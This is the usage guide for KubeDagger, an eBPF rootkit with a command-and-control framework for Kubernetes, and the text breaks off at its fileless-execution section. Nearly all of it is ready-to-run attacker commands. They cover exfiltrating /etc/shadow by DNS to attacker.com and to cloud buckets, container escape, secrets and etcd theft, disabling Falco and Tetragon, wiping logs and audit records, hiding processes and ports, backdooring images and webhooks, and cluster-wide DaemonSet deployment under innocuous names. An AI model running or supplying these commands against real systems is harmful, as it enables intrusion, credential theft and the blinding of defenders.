# KubeDagger Usage Guide

## Table of Contents

- [Prerequisites](#prerequisites)
- [Building](#building)
- [Starting the Server](#starting-the-server)
- [Client Commands](#client-commands)
  - [Network Discovery](#1-network-discovery)
  - [File System Watch](#2-file-system-watch)
  - [Docker Image Override](#3-docker-image-override)
  - [PostgreSQL Credential Access](#4-postgresql-credential-access)
  - [Pipe Program Injection](#5-pipe-program-injection)
  - [TUI Dashboard](#6-tui-dashboard)
  - [DNS Exfiltration](#7-dns-exfiltration)
  - [Kubernetes Discovery](#8-kubernetes-discovery)
  - [Process Tree](#9-process-tree)
  - [MITRE ATT&CK Export](#10-mitre-attck-export)
  - [Kubernetes Privilege Escalation](#11-kubernetes-privilege-escalation)
  - [Container Escape](#12-container-escape)
  - [Secrets Harvesting](#13-secrets-harvesting)
  - [Runtime Security Evasion](#14-runtime-security-evasion)
  - [Network Policy Bypass](#15-network-policy-bypass)
  - [Service Mesh Bypass](#16-service-mesh-bypass)
  - [Observability Poisoning](#17-observability-poisoning)
  - [Cloud Metadata Theft](#18-cloud-metadata-theft)
  - [Cloud Exfiltration](#19-cloud-exfiltration)
  - [Admission Webhook Backdoor](#20-admission-webhook-backdoor)
  - [CRI-Level Image Tampering](#21-cri-level-image-tampering)
  - [DaemonSet Dropper](#22-daemonset-dropper)
  - [Kernel Keyring Theft](#23-kernel-keyring-theft)
  - [TLS Traffic Interception](#24-tls-traffic-interception)
  - [Etcd Credential Theft](#25-etcd-credential-theft)
  - [Log Tampering](#26-log-tampering)
  - [Syscall-Level Hiding](#27-syscall-level-hiding)
  - [Audit Log Filtering](#28-audit-log-filtering)
  - [Pcap Blinding](#29-pcap-blinding)
  - [Core Dump Suppression](#30-core-dump-suppression)
  - [Timestamp Manipulation](#31-timestamp-manipulation)
  - [BPF Polymorphism](#32-bpf-polymorphism)
  - [Fileless Execution](#33-fileless-execution)
  - [XDP Reverse Shell](#34-xdp-reverse-shell)
  - [BPF Map IPC](#35-bpf-map-ipc)
  - [K8s Event C2](#36-k8s-event-c2)
  - [Container Log C2](#37-container-log-c2)
  - [TCP Window Steganography](#38-tcp-window-steganography)
  - [DNS-over-HTTPS C2](#39-dns-over-https-c2)
  - [Covert Channels](#40-covert-channels)
  - [ARP Cache Poisoning](#41-arp-cache-poisoning)
  - [Kubelet API Abuse](#42-kubelet-api-abuse)
  - [Veth Pair Hijacking](#43-veth-pair-hijacking)
  - [Sidecar Container Injection](#44-sidecar-container-injection)
  - [Supply Chain Injection](#45-supply-chain-injection)
  - [GitOps Repository Poisoning](#46-gitops-repository-poisoning)
  - [Service Account Token Minting](#47-service-account-token-minting)
  - [Pod Identity Theft](#48-pod-identity-theft)
  - [Image Signature Bypass](#49-image-signature-bypass)
  - [CRD-Based Backdoor](#50-crd-based-backdoor)
  - [Honeypot Detection](#51-honeypot-detection)
  - [Scheduler Starvation](#52-scheduler-starvation)
  - [Syscall Fault Injection](#53-syscall-fault-injection)
  - [Cgroup Resource Manipulation](#54-cgroup-resource-manipulation)
  - [Leader Election Disruption](#55-leader-election-disruption)
  - [Certificate Rotation Sabotage](#56-certificate-rotation-sabotage)
  - [Kernel Keyring MITM](#57-kernel-keyring-mitm)
- [HTTP/2 C2 Framework](#http2-c2-framework)
  - [C2 Server](#c2-server)
  - [Agent](#agent)
  - [Operator CLI](#operator-cli)
  - [Module System](#module-system)
  - [Operator Web UI](#operator-web-ui)
- [Encrypted C2 Channel](#encrypted-c2-channel)
- [Persistence](#persistence)
- [Multi-Node Coordination](#multi-node-coordination)
- [Integration Testing](#integration-testing)

---

## Prerequisites

- Linux kernel 5.4+ with eBPF support (BTF-enabled for CO-RE portability)
- Go 1.25+
- Kernel headers installed (`/lib/modules/$(uname -r)`)
- clang & llvm 11+
- Root privileges (for loading eBPF programs)
- [Graphviz](https://graphviz.org/) (optional, for network graph generation)

## Building

```shell
# Build everything (eBPF + all binaries)
make

# Build only the C2 server
make build-server

# Build cross-platform agents (linux/amd64, windows/amd64, darwin/arm64)
make build-agent

# Build operator CLI
make build-operator

# Install client to /usr/bin/
make install_client
```

This produces binaries in `./bin/`:
- `kubedagger` — the eBPF rootkit daemon (Linux only, requires root)
- `kubedagger-client` — CLI for interacting with the eBPF daemon
- `kubedagger-server` — HTTP/2 C2 server with mTLS agent listener + management port
- `kubedagger-agent-linux` — cross-platform agent (Linux amd64)
- `kubedagger-agent-windows.exe` — cross-platform agent (Windows amd64)
- `kubedagger-agent-darwin` — cross-platform agent (macOS arm64)
- `kubedagger-operator` — operator CLI for managing agents and tasks
- `webapp` — the web-based control panel

---

## Starting the Server

```shell
# Basic usage (requires root)
sudo ./bin/kubedagger --ingress eth0 --egress eth0

# With custom C2 port
sudo ./bin/kubedagger -i eth0 -e eth0 -p 8080

# Disable network probes (useful for testing)
sudo ./bin/kubedagger -i eth0 -e eth0 --disable-network-probes

# With Docker interception
sudo ./bin/kubedagger -i eth0 -e eth0 --docker /usr/bin/dockerd

# With persistence (auto-reinstalls after reboot)
sudo ./bin/kubedagger -i eth0 -e eth0 --persist
```

### Server flags

| Flag | Default | Description |
|------|---------|-------------|
| `-i, --ingress` | `enp0s3` | Ingress network interface |
| `-e, --egress` | `enp0s3` | Egress network interface |
| `-p, --target-http-server-port` | `8000` | HTTP C2 port |
| `--docker` | `/usr/bin/dockerd` | Path to Docker daemon |
| `--postgres` | `/usr/lib/postgresql/12/bin/postgres` | Path to Postgres daemon |
| `--disable-network-probes` | `false` | Skip network eBPF probes |
| `--disable-bpf-obfuscation` | `false` | Don't hide from bpf syscall |
| `--persist` | `false` | Install persistence mechanism |
| `-l, --log-level` | `info` | Log level (trace/debug/info/warn/error) |

---

## Client Commands

The client communicates with the server over HTTP. Set the target with `--target` or the `KUBEDAGGER_TARGET` environment variable.

```shell
# Default target is http://localhost:8000
kubedagger-client --target http://10.0.2.5:8000 <command>

# Or use environment variable
export KUBEDAGGER_TARGET=http://10.0.2.5:8000
kubedagger-client <command>
```

---

### 1. Network Discovery

Discover hosts and open ports on the target's network.

```shell
# Get passively discovered network flows
kubedagger-client network_discovery get --passive

# Get actively scanned results
kubedagger-client network_discovery get --active

# Get both
kubedagger-client network_discovery get --passive --active

# Scan a range of ports on a target IP
kubedagger-client network_discovery scan --ip 192.168.1.1 --port 80 --range 100
```

**Flags:**
| Flag | Description |
|------|-------------|
| `--passive` | Show passively discovered flows |
| `--active` | Show actively scanned results |
| `--ip` | Starting IP for scan (format: X.X.X.X) |
| `--port` | Starting port number |
| `--range` | Number of ports to scan (default: 20) |

---

### 2. File System Watch

Exfiltrate file contents from the target system.

```shell
# Add a watch on a file
kubedagger-client fs_watch add /etc/shadow

# Add a watch on a file inside a container
kubedagger-client fs_watch add /etc/passwd --in-container

# Actively trigger a file read (don't wait for natural access)
kubedagger-client fs_watch add /etc/shadow --active

# Retrieve the watched file content
kubedagger-client fs_watch get /etc/shadow

# Save to local file
kubedagger-client fs_watch get /etc/shadow -o shadow_copy.txt

# Remove the watch
kubedagger-client fs_watch delete /etc/shadow
```

**Flags:**
| Flag | Description |
|------|-------------|
| `--in-container` | Target file is inside a container |
| `--active` | Actively trigger the file to be opened |
| `-o, --output` | Save output to a file |

---

### 3. Docker Image Override

Intercept and replace Docker images at runtime.

```shell
# List detected Docker images
kubedagger-client docker list
kubedagger-client docker list -o images.json

# Override an image (replace nginx with a backdoored version)
kubedagger-client docker put --from nginx:latest --to evil/nginx:latest --override 1

# Control ping response for an image (hide from health checks)
# 0=nop, 1=crash, 2=run, 3=hide
kubedagger-client docker put --from myapp:v1 --to myapp:v1 --ping 3

# Remove an override
kubedagger-client docker delete --from nginx:latest
```

**Flags:**
| Flag | Description |
|------|-------------|
| `--from` | Docker image to intercept |
| `--to` | Replacement image |
| `--override` | Action: 0=nop, 1=replace |
| `--ping` | Ping response: 0=nop, 1=crash, 2=run, 3=hide |

---

### 4. PostgreSQL Credential Access

Exfiltrate and manipulate PostgreSQL credentials.

```shell
# List captured Postgres credentials
kubedagger-client postgres list
kubedagger-client postgres list -o creds.json

# Override a role's password (role must exist)
kubedagger-client postgres put --role admin --secret "newpassword123"

# Remove the override
kubedagger-client postgres delete --role admin
```

**Flags:**
| Flag | Description |
|------|-------------|
| `--role` | PostgreSQL role name |
| `--secret` | New password/secret |
| `-o, --output` | Save output to file |

---

### 5. Pipe Program Injection

Intercept data flowing between two piped processes and inject a program.

```shell
# Inject a program between two processes
# Example: inject a keylogger between bash and sshd
kubedagger-client pipe_prog put my_program --from bash --to sshd

# With backup (re-inject original data after your program)
kubedagger-client pipe_prog put my_program --from bash --to sshd --backup

# Remove the injection
kubedagger-client pipe_prog delete --from bash --to sshd
```

**Flags:**
| Flag | Description |
|------|-------------|
| `--from` | Source process command (max 16 chars) |
| `--to` | Destination process command (max 16 chars) |
| `--backup` | Re-inject original data after program |

---

### 6. TUI Dashboard

Launch a real-time terminal UI showing live KubeDagger activity.

```shell
# Start the dashboard (default 2s refresh)
kubedagger-client dashboard

# Custom refresh rate
kubedagger-client dashboard --refresh 5

# Point at a remote target
kubedagger-client dashboard --target http://10.0.2.5:8000
```

**Keyboard controls:**
| Key | Action |
|-----|--------|
| `Tab` | Switch between panes |
| `1-4` | Jump to specific pane (Flows/FS/Docker/Processes) |
| `q` / `Ctrl+C` | Quit |

**Panes:**
1. **Network Flows** — Live network connections (color-coded by protocol)
2. **FS Watches** — Active file system watches and exfiltrated data
3. **Docker** — Image overrides in effect
4. **Processes** — Process activity on the target

---

### 7. DNS Exfiltration

Exfiltrate data through DNS queries when HTTP is blocked. Data is base32-encoded into DNS subdomain labels.

```shell
# Exfiltrate a file via DNS queries
kubedagger-client dns_exfil --file /etc/shadow --domain attacker.com

# Use a specific DNS server
kubedagger-client dns_exfil --file /etc/passwd --domain exfil.example.com --server 10.0.0.53
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--file` | (required) | Path to file to exfiltrate |
| `--domain` | (required) | Domain for DNS queries |
| `--server` | `8.8.8.8` | DNS server to send queries to |

**How it works:**
1. Reads the target file
2. Splits into 30-byte chunks
3. Base32-encodes each chunk
4. Sends as DNS TXT queries: `<seq_hex><encoded_chunk>.<domain>`
5. Terminates with `ffff.end.<domain>`

**Receiving side:** Run a DNS server that logs TXT queries for your domain, then decode the base32 chunks in sequence order.

---

### 8. Kubernetes Discovery

Enumerate Kubernetes cluster resources and identify attack targets.

```shell
# Discover all namespaces
kubedagger-client k8s discover

# Discover a specific namespace
kubedagger-client k8s discover --namespace kube-system

# Save report to file
kubedagger-client k8s discover -o cluster_report.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--namespace` | `all` | Namespace to enumerate (or "all") |
| `-o, --output` | stdout | Output file for JSON report |

**Output includes:**
- Nodes (name, IP, OS, kernel version)
- Pods (name, namespace, IP, images, node)
- Services (name, type, ClusterIP, ports)
- Namespaces
- **Targets** — automatically flagged:
  - Privileged containers
  - Pods with `hostPID: true`
  - Pods with `hostNetwork: true`

**Authentication:** Automatically detects:
1. In-cluster service account (`/var/run/secrets/kubernetes.io/serviceaccount/`)
2. Local kubeconfig (`~/.kube/config`)

---

### 9. Process Tree

Fetch and display the process tree from the target system.

```shell
# Get the process tree
kubedagger-client proctree get

# From a remote target
kubedagger-client proctree get --target http://10.0.2.5:8000
```

**Output:** Hierarchical tree showing PID, PPID, command name, and start time for all processes tracked by the eBPF probes.

---

### 10. MITRE ATT&CK Export

Generate MITRE ATT&CK technique mappings for all KubeDagger capabilities.

```shell
# Export as ATT&CK Navigator JSON layer
kubedagger-client mitre export --format json -o navigator_layer.json

# Export as markdown report
kubedagger-client mitre export --format markdown -o report.md

# Print to stdout
kubedagger-client mitre export --format markdown
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--format` | `json` | Output format: `json` or `markdown` |
| `-o, --output` | stdout | Output file path |

**Mapped techniques (37 total):**
| Technique | ID | KubeDagger Feature |
|-----------|----|--------------------|
| Implant Internal Image | T1525 | docker, webhook, cri-tamper |
| Network Service Scanning | T1046 | network_discovery |
| Data from Local System | T1005 | fs_watch |
| Process Injection | T1055 | pipe_prog |
| Application Layer Protocol: DNS | T1071.004 | dns_exfil |
| Hide Artifacts: Hidden Files | T1564.001 | file/process hiding |
| OS Credential Dumping | T1003 | postgres |
| Scheduled Task/Job: Cron | T1053.003 | persistence |
| Rootkit | T1014 | BPF program hiding |
| Traffic Signaling | T1205 | XDP-based C2 |
| Adversary-in-the-Middle | T1557 | DNS spoofing |
| Escape to Host | T1611 | container escape |
| System Information Discovery | T1082 | k8s discover |
| Application Layer Protocol: Web | T1071.001 | HTTP C2 |
| Impair Defenses | T1562.001 | evasion |
| Native API | T1106 | eBPF syscall |
| Cloud Instance Metadata API | T1552.005 | cloud meta |
| Valid Accounts: Cloud | T1078.004 | cloud meta |
| Credentials In Files | T1552.001 | secrets harvest |
| Steal Application Access Token | T1528 | secrets harvest |
| Network Boundary Bridging | T1599.001 | netbypass |
| Proxy: Domain Fronting | T1090.004 | meshbypass |
| Transfer Data to Cloud Account | T1537 | cloud exfil |
| Data Manipulation: Transmitted | T1565.002 | obs-poison |
| Container Orchestration Job | T1053.007 | daemonset |
| Network Sniffing | T1040 | tls-intercept |
| Unsecured Credentials: Private Keys | T1552.004 | etcd-steal |
| Password Managers | T1555.005 | keyring |
| Clear Linux/Mac System Logs | T1070.002 | log-tamper |
| Indicator Blocking | T1562.006 | syscall-bypass |
| Reflective Code Loading | T1620 | fileless-exec |
| Protocol Tunneling | T1572 | covert-channel |
| ARP Cache Poisoning | T1557.002 | arp-spoof |
| Container Administration Command | T1609 | kubelet |
| Compromise Software Supply Chain | T1195.002 | supply-chain |
| Application Access Token | T1550.001 | sa-token |
| Code Signing Policy Modification | T1553.006 | sig-bypass |

The JSON output is compatible with the [ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/) for visualization.

---

### 11. Kubernetes Privilege Escalation

Exploit Kubernetes RBAC misconfigurations to escalate privileges within the cluster.

```shell
# Escalate privileges using current service account
kubedagger-client k8s abuse --action escalate

# Dump secrets from accessible namespaces
kubedagger-client k8s abuse --action dump-secrets

# Use a specific stolen token
kubedagger-client k8s abuse --action escalate --token "eyJhbGciOiJS..."
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--action` | (required) | Action: `escalate` or `dump-secrets` |
| `--token` | (auto-detect) | Bearer token to use for API calls |

---

### 12. Container Escape

Detect and execute container escape techniques based on the runtime environment.

```shell
# Detect available escape vectors
kubedagger-client escape --action detect

# Auto-select and execute the best escape technique
kubedagger-client escape --action execute --technique auto

# Use a specific escape technique
kubedagger-client escape --action execute --technique privileged
kubedagger-client escape --action execute --technique socket
kubedagger-client escape --action execute --technique cgroup
kubedagger-client escape --action execute --technique nsenter

# Save escape report
kubedagger-client escape --action detect -o escape_vectors.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--action` | (required) | `detect` (enumerate vectors) or `execute` (break out) |
| `--technique` | `auto` | Technique: `auto`, `privileged`, `socket`, `cgroup`, `nsenter` |
| `-o, --output` | stdout | Output file |

**Techniques:**
- **privileged** — Abuse `--privileged` container to mount host filesystem
- **socket** — Exploit exposed Docker/containerd socket
- **cgroup** — Abuse cgroup release_agent for code execution on host
- **nsenter** — Use `nsenter` with host PID namespace access

---

### 13. Secrets Harvesting

Harvest credentials and secrets from multiple sources on the target.

```shell
# Harvest from all available sources
kubedagger-client secrets harvest --sources all

# Target specific sources
kubedagger-client secrets harvest --sources env,k8s
kubedagger-client secrets harvest --sources cloud,vault

# Save harvested secrets
kubedagger-client secrets harvest --sources all -o secrets.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--sources` | `all` | Comma-separated: `all`, `env`, `k8s`, `cloud`, `docker`, `vault`, `kubeconfig` |
| `-o, --output` | stdout | Output file |

**Sources:**
- **env** — Environment variables (AWS keys, tokens, passwords)
- **k8s** — Kubernetes secrets from accessible namespaces
- **cloud** — Cloud provider metadata credentials
- **docker** — Docker config credentials (`~/.docker/config.json`)
- **vault** — HashiCorp Vault token files
- **kubeconfig** — Kubeconfig files with embedded credentials

---

### 14. Runtime Security Evasion

Evade runtime security tools by disabling or blinding their eBPF-based sensors.

```shell
# Evade all supported security tools
kubedagger-client evasion --mode all

# Target a specific tool
kubedagger-client evasion --mode falco
kubedagger-client evasion --mode tetragon
kubedagger-client evasion --mode kubearmor
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--mode` | (required) | Target: `falco`, `tetragon`, `kubearmor`, or `all` |

**How it works:**
- Detaches or corrupts the target tool's eBPF programs
- Patches syscall entry points to skip security hooks
- Modifies perf/ring buffer maps to drop events

---

### 15. Network Policy Bypass

Bypass Kubernetes NetworkPolicies and CNI-enforced network segmentation.

```shell
# Tunnel traffic through an allowed path
kubedagger-client netbypass --mode tunnel --dest-ip 10.0.5.3 --dest-port 443

# Spoof source identity to bypass policy selectors
kubedagger-client netbypass --mode spoof --dest-ip 10.0.5.3 --dest-port 80

# Encapsulate traffic to evade deep packet inspection
kubedagger-client netbypass --mode encap --dest-ip 10.0.5.3 --dest-port 8080

# Direct bypass via XDP (skip TC-level policy enforcement)
kubedagger-client netbypass --mode direct --dest-ip 10.0.5.3 --dest-port 443

# Save results
kubedagger-client netbypass --mode tunnel --dest-ip 10.0.5.3 --dest-port 443 -o bypass.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--mode` | (required) | Bypass method: `tunnel`, `spoof`, `encap`, `direct` |
| `--dest-ip` | (required) | Destination IP address |
| `--dest-port` | (required) | Destination port |
| `-o, --output` | stdout | Output file |

---

### 16. Service Mesh Bypass

Bypass service mesh sidecar proxies (Istio, Linkerd) to reach services directly.

```shell
# XDP-level bypass (fastest, skips sidecar entirely)
kubedagger-client meshbypass --mode xdp --mesh-target 10.0.3.5:8080

# UID-based bypass (send traffic as mesh proxy UID)
kubedagger-client meshbypass --mode uid --mesh-target 10.0.3.5:8080

# Raw socket bypass (avoid iptables redirect rules)
kubedagger-client meshbypass --mode raw --mesh-target 10.0.3.5:8080

# Exclude from mesh (modify pod annotations)
kubedagger-client meshbypass --mode exclude --mesh-target 10.0.3.5:8080
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--mode` | (required) | Method: `xdp`, `uid`, `raw`, `exclude` |
| `--mesh-target` | (required) | Target address (IP:port) |

---

### 17. Observability Poisoning

Poison observability pipelines to hide activity or create alert fatigue.

```shell
# Hide metrics from Prometheus
kubedagger-client obs-poison --target-system prometheus --endpoint http://prometheus:9090 --strategy hide

# Inject noise into OpenTelemetry
kubedagger-client obs-poison --target-system otel --endpoint http://otel-collector:4317 --strategy noise

# Create alert fatigue in StatsD
kubedagger-client obs-poison --target-system statsd --endpoint statsd:8125 --strategy fatigue

# Save poisoning report
kubedagger-client obs-poison --target-system prometheus --endpoint http://prometheus:9090 --strategy hide -o report.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--target-system` | (required) | Target: `prometheus`, `otel`, `statsd` |
| `--endpoint` | (required) | Endpoint URL/address of the target system |
| `--strategy` | (required) | Strategy: `hide` (suppress), `noise` (flood), `fatigue` (false alerts) |
| `-o, --output` | stdout | Output file |

---

### 18. Cloud Metadata Theft

Steal cloud instance credentials via the metadata service (IMDS).

```shell
# Auto-detect cloud provider and steal credentials
kubedagger-client cloud meta --provider auto

# Target a specific provider
kubedagger-client cloud meta --provider aws
kubedagger-client cloud meta --provider gcp
kubedagger-client cloud meta --provider azure
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--provider` | `auto` | Cloud provider: `auto`, `aws`, `gcp`, `azure` |

**What it retrieves:**
- **AWS** — IAM role credentials from `169.254.169.254/latest/meta-data/iam/`
- **GCP** — Service account tokens from `metadata.google.internal`
- **Azure** — Managed identity tokens from `169.254.169.254/metadata/identity/`

---

### 19. Cloud Exfiltration

Exfiltrate data to attacker-controlled cloud storage buckets.

```shell
# Exfil a file to S3 using stolen metadata credentials
kubedagger-client cloud exfil --provider aws --bucket exfil-bucket --file /etc/shadow --creds-from meta

# Exfil to GCS with manual credentials
kubedagger-client cloud exfil --provider gcp --bucket exfil-bucket --file /tmp/dump.tar.gz --creds-from manual

# Exfil to Azure Blob Storage
kubedagger-client cloud exfil --provider azure --bucket exfil-container --file /tmp/secrets.json --creds-from meta

# Save upload report
kubedagger-client cloud exfil --provider aws --bucket exfil-bucket --file /etc/shadow --creds-from meta -o upload.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--provider` | (required) | Cloud provider: `aws`, `gcp`, `azure` |
| `--bucket` | (required) | Destination bucket/container name |
| `--file` | (required) | Local file path to exfiltrate |
| `--creds-from` | `meta` | Credential source: `meta` (metadata service) or `manual` |
| `-o, --output` | stdout | Output file for upload report |

---

### 20. Admission Webhook Backdoor

Deploy a mutating admission webhook that injects a backdoor into new pods.

```shell
# Deploy the webhook backdoor
kubedagger-client webhook --action deploy --namespace kube-system --image evil/injector:latest

# Check webhook status
kubedagger-client webhook --action deploy --namespace kube-system --image evil/injector:latest -o status.json

# Remove the webhook
kubedagger-client webhook --action remove --namespace kube-system
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--action` | (required) | `deploy` or `remove` |
| `--namespace` | `default` | Namespace for webhook resources |
| `--image` | (required for deploy) | Container image for the webhook server |
| `-o, --output` | stdout | Output file |

**How it works:**
1. Creates a MutatingWebhookConfiguration targeting pod creation
2. Deploys a webhook server that injects a sidecar container into new pods
3. The sidecar runs the specified image with host-level access

---

### 21. CRI-Level Image Tampering

Tamper with container images at the Container Runtime Interface level, bypassing image pull verification.

```shell
# Overlay filesystem tampering (containerd)
kubedagger-client cri-tamper --runtime containerd --mode overlay --target-image nginx:latest --inject-binary /tmp/backdoor

# Content-addressable storage manipulation (CRI-O)
kubedagger-client cri-tamper --runtime crio --mode cas --target-image webapp:v1 --inject-binary /tmp/implant

# Runc binary replacement
kubedagger-client cri-tamper --runtime containerd --mode runc --target-image "*" --inject-binary /tmp/evil-runc

# Save tampering report
kubedagger-client cri-tamper --runtime containerd --mode overlay --target-image nginx:latest --inject-binary /tmp/backdoor -o tamper.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--runtime` | (required) | Container runtime: `containerd` or `crio` |
| `--mode` | (required) | Tampering mode: `overlay`, `cas`, `runc` |
| `--target-image` | (required) | Image to tamper with (or `*` for runc mode) |
| `--inject-binary` | (required) | Path to binary to inject |
| `-o, --output` | stdout | Output file |

**Modes:**
- **overlay** — Modify the overlay filesystem layers after image extraction
- **cas** — Manipulate content-addressable storage blobs directly
- **runc** — Replace the runc binary to inject code at container start

---

### 22. DaemonSet Dropper

Deploy KubeDagger as a DaemonSet for cluster-wide rootkit installation across all nodes.

```shell
# Deploy the DaemonSet
kubedagger-client daemonset --action deploy --image kubedagger:latest --name kube-health --namespace kube-system

# Check deployment status
kubedagger-client daemonset --action status --name kube-health --namespace kube-system

# Remove the DaemonSet
kubedagger-client daemonset --action remove --name kube-health --namespace kube-system

# Save status report
kubedagger-client daemonset --action status --name kube-health --namespace kube-system -o status.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--action` | (required) | `deploy`, `remove`, or `status` |
| `--image` | (required for deploy) | Container image to deploy |
| `--name` | `kube-health` | DaemonSet name |
| `--namespace` | `kube-system` | Target namespace |
| `-o, --output` | stdout | Output file |

**How it works:**
1. Creates a privileged DaemonSet with `hostPID`, `hostNetwork`, and volume mounts
2. Each pod loads KubeDagger's eBPF programs on its node
3. Uses legitimate-sounding names to blend with system workloads
4. Tolerates all taints to ensure deployment on every node (including control plane)

---

### 23. Kernel Keyring Theft

Steal encryption keys, Kerberos tickets, and eCryptfs keys from the Linux kernel keyring subsystem.

```shell
# List all keys in the keyring
kubedagger-client keyring --mode list

# Dump all user-type keys
kubedagger-client keyring --mode dump --key-type user

# Monitor keyring operations in real-time
kubedagger-client keyring --mode monitor --key-type all

# Save to file
kubedagger-client keyring --mode dump --key-type logon -o keys.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--mode` | `list` | Operation mode: `list`, `dump`, or `monitor` |
| `--key-type` | `all` | Key type filter: `all`, `user`, or `logon` |
| `-o, --output` | stdout | Output file |

---

### 24. TLS Traffic Interception

Attach uprobes to SSL_read/SSL_write to capture plaintext traffic before/after encryption.

```shell
# Start intercepting a specific process
kubedagger-client tls-intercept --action start --target-pid 1234 --lib openssl

# Auto-detect TLS library
kubedagger-client tls-intercept --action start --target-pid 1234 --lib auto

# Stop interception
kubedagger-client tls-intercept --action stop --target-pid 1234

# Dump captured data
kubedagger-client tls-intercept --action dump -o captured.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--action` | (required) | `start`, `stop`, or `dump` |
| `--target-pid` | (required for start/stop) | PID of the target process |
| `--lib` | `auto` | TLS library: `openssl`, `gnutls`, or `auto` |
| `-o, --output` | stdout | Output file |

---

### 25. Etcd Credential Theft

Intercept etcd gRPC traffic to extract secrets, tokens, and client certificates.

```shell
# Dump all secrets from etcd
kubedagger-client etcd-steal --mode dump

# Watch specific key prefix
kubedagger-client etcd-steal --mode watch --key-prefix /registry/secrets

# Save results
kubedagger-client etcd-steal --mode dump --key-prefix /registry/secrets/kube-system -o etcd.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--mode` | `dump` | Operation mode: `dump` or `watch` |
| `--key-prefix` | `/registry/secrets` | Etcd key prefix to target |
| `-o, --output` | stdout | Output file |

---

### 26. Log Tampering

Hook vfs_write and journald to drop, modify, or inject log entries in real-time.

```shell
# Drop log entries matching a pattern
kubedagger-client log-tamper --mode drop --pattern "kubedagger" --target syslog

# Modify container logs
kubedagger-client log-tamper --mode modify --pattern "error" --target container

# Inject fake entries into journal
kubedagger-client log-tamper --mode inject --pattern "healthy" --target journal

# Save operation report
kubedagger-client log-tamper --mode drop --pattern "suspicious" --target syslog -o tamper.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--mode` | (required) | `drop`, `modify`, or `inject` |
| `--pattern` | (required) | Regex pattern for matching/injecting |
| `--target` | `syslog` | Log target: `syslog`, `journal`, or `container` |
| `-o, --output` | stdout | Output file |

---

### 27. Syscall-Level Hiding

Hook getdents64, stat, and /proc reads to hide PIDs, files, and network ports from userspace.

```shell
# Hide specific PIDs
kubedagger-client syscall-bypass --hide-pids "1234,5678"

# Hide files and ports
kubedagger-client syscall-bypass --hide-files "rootkit.so,backdoor" --hide-ports "4444,8080"

# Combined hiding
kubedagger-client syscall-bypass --hide-pids "1234" --hide-files "evil.bin" --hide-ports "9001" -o hide.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--hide-pids` | | Comma-separated PIDs to hide |
| `--hide-files` | | Comma-separated filenames to hide |
| `--hide-ports` | | Comma-separated ports to hide |
| `-o, --output` | stdout | Output file |

---

### 28. Audit Log Filtering

Hook audit_log_start/end to suppress or modify audit records for rootkit operations.

```shell
# Suppress audit records for specific PIDs
kubedagger-client audit-filter --mode suppress --filter-pids "1234,5678"

# Modify audit records
kubedagger-client audit-filter --mode modify --filter-pids "1234"

# Save report
kubedagger-client audit-filter --mode suppress --filter-pids "1234" -o audit.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--mode` | `suppress` | Filter mode: `suppress` or `modify` |
| `--filter-pids` | (required) | Comma-separated PIDs to filter |
| `-o, --output` | stdout | Output file |

---

### 29. Pcap Blinding

Attach socket filters to AF_PACKET sockets to hide C2 traffic from tcpdump and Wireshark.

```shell
# Hide traffic on specific ports
kubedagger-client pcap-blind --hide-ports "9001,4444"

# Hide traffic from specific IPs
kubedagger-client pcap-blind --hide-ips "10.0.2.5,192.168.1.100"

# Combined
kubedagger-client pcap-blind --hide-ports "9001" --hide-ips "10.0.2.5" -o pcap.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--hide-ports` | | Comma-separated ports to hide from captures |
| `--hide-ips` | | Comma-separated IPs to hide from captures |
| `-o, --output` | stdout | Output file |

---

### 30. Core Dump Suppression

Hook do_coredump to prevent memory dumps of rootkit processes, blocking memory forensics.

```shell
# Suppress core dumps for specific PIDs
kubedagger-client coredump-suppress --pids "1234,5678"

# Save report
kubedagger-client coredump-suppress --pids "1234,5678" -o coredump.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--pids` | (required) | Comma-separated PIDs to protect |
| `-o, --output` | stdout | Output file |

---

### 31. Timestamp Manipulation

Hook clock functions to skew time responses for targeted processes, confusing forensic timelines.

```shell
# Fixed time offset
kubedagger-client timeskew --target-pids "1234" --offset "-3600" --mode fixed

# Random jitter
kubedagger-client timeskew --target-pids "1234,5678" --offset "300" --mode random

# Save report
kubedagger-client timeskew --target-pids "1234" --offset "-7200" --mode fixed -o skew.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--target-pids` | (required) | Comma-separated PIDs to skew |
| `--offset` | (required) | Time offset in seconds |
| `--mode` | `fixed` | Skew mode: `fixed` or `random` |
| `-o, --output` | stdout | Output file |

---

### 32. BPF Polymorphism

Mutate BPF bytecode at load time — randomize map names, reorder instructions, insert NOPs to evade signatures.

```shell
# Reload with random seed
kubedagger-client polymorph --seed "random"

# Reload with specific seed
kubedagger-client polymorph --seed "0xdeadbeef"

# Save mutation report
kubedagger-client polymorph --seed "random" -o morph.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--seed` | `random` | Mutation seed value |
| `-o, --output` | stdout | Output file |

---

### 33. Fileless Execution

Execute payloads via memfd_create + execveat with no disk artifacts.

```shell
# Execute a base64 payload
